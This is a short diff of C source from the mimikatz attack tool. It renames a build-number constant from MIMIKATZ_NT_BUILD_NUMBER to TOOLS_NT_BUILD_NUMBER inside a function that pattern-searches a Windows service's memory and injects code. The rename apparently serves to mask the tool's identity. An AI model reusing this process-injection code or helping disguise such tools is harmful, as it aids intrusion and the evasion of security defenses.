@@ -75,7 +75,7 @@ BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
 						{
 							sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
 							sMemory.kull_m_memoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;
-							if(currentReference = kull_m_patch_getGenericFromBuild(ScSendControlReferences, ARRAYSIZE(ScSendControlReferences), MIMIKATZ_NT_BUILD_NUMBER))
+							if(currentReference = kull_m_patch_getGenericFromBuild(ScSendControlReferences, ARRAYSIZE(ScSendControlReferences), TOOLS_NT_BUILD_NUMBER))
 							{
 								aLocalMemory.address = currentReference->Search.Pattern;
 								if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
@@ -89,7 +89,7 @@ BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
 
 				if(pScSendControl)
 				{
-					if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
+					if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
 					{
 						szCode = (DWORD) ((PBYTE) kuhl_service_sendcontrol_std_thread_end - (PBYTE) kuhl_service_sendcontrol_std_thread);
 						pCode = kuhl_service_sendcontrol_std_thread;
